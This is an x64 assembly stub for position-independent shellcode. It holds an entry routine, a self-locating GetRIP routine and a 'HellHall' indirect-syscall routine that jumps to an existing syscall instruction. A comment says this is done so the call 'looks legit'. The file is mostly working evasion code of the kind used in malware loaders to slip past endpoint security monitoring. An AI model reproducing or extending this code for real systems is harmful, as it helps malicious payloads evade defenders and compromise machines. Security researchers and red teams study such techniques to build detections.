
extern Entry

global Start
global GetRIP
global HellHall
global SetConfig

section .text$A
    Start:
        push    rsi
        mov	rsi, rsp
        and	rsp, 0FFFFFFFFFFFFFFF0h

        sub	rsp, 020h
        call    Entry

        mov	rsp, rsi
        pop	rsi
    ret

section .text$F
    GetRIP:
        call    retptr

    retptr:
        pop	rax
        sub	rax, 5
    ret

section .text$E
    SetConfig:
    	mov r10d, ecx
        mov r11, rdx			
        ret
        
section .text$E
    HellHall:
        mov eax, r10d		
        mov r10, rcx	
        jmp r11		; JUMPING TO A ADDRESS WHERE WE HAVE `syscall` INSTRUCTION - SO THAT IT LOOKS LEGIT
        ret
    ret
